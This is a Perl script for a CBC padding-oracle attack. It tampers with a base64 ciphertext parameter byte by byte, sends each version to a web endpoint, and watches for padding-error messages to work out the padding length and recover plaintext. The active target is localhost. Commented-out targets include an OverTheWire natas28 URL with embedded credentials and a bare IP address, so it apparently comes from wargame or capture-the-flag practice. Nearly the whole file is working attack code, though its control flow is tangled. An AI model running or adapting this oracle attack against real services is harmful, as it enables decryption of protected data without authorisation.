#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;# https://perldoc.perl.org/HTTP/Tiny.html
use MIME::Base64; 
use URI::Escape;#  http://search.cpan.org/perldoc/URI::Escape
use Encode qw(decode encode);
use List::MoreUtils qw(any);

print "Ich beginne\n";

my $bSize = 16;

my $AIM = 0;

my @wante = ('ValueError: Padding is incorrect.', 'ValueError: PKCS#7 padding is incorrect.');

my $parm = 'sn7DK7gTuLUp2NRBzN8PRejnx1HscfJWvc2U9UaspIdsJX0OAizXs%2BlHR%2BnX%2BxxpohDZC%2BRkDOiLTzeWlWGzEgFaccOxG%2F2N5f6w5kbGjvo%3D';
#my $parm = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ3JtkSaJRrJwlP%2BDsbHXlYKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D';
#my $parm = 'ULp-Dd93!!pZmzC6q7CnFh9AOMB6NdDJpT5FtFwdPAU4ctEYKuzA14gvyHodr60GOgXDSDIm2PFrp5jLvlQS5ofQGpTrPoQDGq4yl25-QEgSOsYTzV9XidDTHtXncxYmz25bKUDqCz3KZSI0xdbMcyRI7lxDWwtR5MLu!RHzANbyyZwnY037m66XCA-XjMzJbheQcjc5O5yLfLW9iwFDNA~~';

#$parm =~ s/-/+/ig;
#$parm =~ s/!/\//ig;
#$parm =~ s/~/=/ig;

my $url = 'http://127.0.0.1:5000/?cte=';

#my $url = 'http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php/?query=';

#my $url = 'http://35.227.24.107/e4fe34027d/?post=';

$parm = uri_unescape($parm);

$parm = decode_base64($parm);

my $qLen = length($parm)-1;

print "String Length: ".$qLen."\n";

#my $octets = decode("UTF-8", $parm);
#print $octets."\n";

# Padding length
my $tempPARM = $parm;
my $it = 6;
my $currentB = $qLen-($bSize+$it);

substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
my $return = getRequest($tempPARM);
my $limit = 0;
if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = 17;} # edit this to reflect changes of the #bSize variable

while ($it < $limit){
    $tempPARM = $parm;
    $currentB = $qLen-($bSize+$it);

    substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
    $return = getRequest($tempPARM);
    if ($return == 1){ # Test  if using a ($return) statment works
        if ($it == 0){
            $AIM = $it;
        }else{
            $tempPARM = $parm;
            $it--;
            $currentB = $qLen-($bSize+$it);

            substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
            $return = getRequest($tempPARM);
            if ($return == 1){
                $AIM = $it; #Maybe do some inital arithmetic here
            }else{
                $AIM = $it+1; #Maybe do some inital arithmetic here
            }
        }
        last;
    }else{
        $it = $it + 2;
    }
}
if ($it == 18){
    $it = $bSize; #Maybe do some inital arithmetic here
}
#

print "\n$AIM\n\n";

sub getRequest {
    my $heel = uri_escape(encode_base64($_[0], ''));
    print "$heel\n";
    my $response = HTTP::Tiny->new->get($url.$heel);
    if (not any { $response->{content} =~ $_ } @wante){
        return 1;
    }
    else{
        return 0;
    }

exit();


$it = 0;
while($it < $bSize){
    $currentB = $qLen-($bSize+$it);
    my $byte = ord(substr($parm, $currentB, 1)) ;
    my $whBYTE = $byte;
    $byte++;
    print "it = ".$it."\n";
    while($byte != $whBYTE){
        my $cAIM = substr($parm, $currentB, 1);
        substr($parm, $currentB, 1) = chr($byte);
        my $tempQ =  uri_escape(encode_base64($parm, ''));
        #my $tempQ = encode_base64($parm, '');
        #$tempQ =~ s/\+/-/ig;
        #$tempQ =~ s/\//!/ig;
        #$tempQ =~ s/=/~/ig;
        $response = HTTP::Tiny->new->get($url.$tempQ);
        if (not any { $response->{content} =~ $_ } @wante){
            my $AIM = 1;
            print $byte."\n".$url.$tempQ."\n";
            print "$byte, ".ord($cAIM)." $AIM\n";
            my $xD = $byte^ord($cAIM)^$AIM;
            print "Plain Text: ".$xD."\n";
            exit();
            last;
        }else{
            print $byte." ";
        }
        $byte = ($byte + 1)%256;
    }
    $it++;
}
print "\n";
}
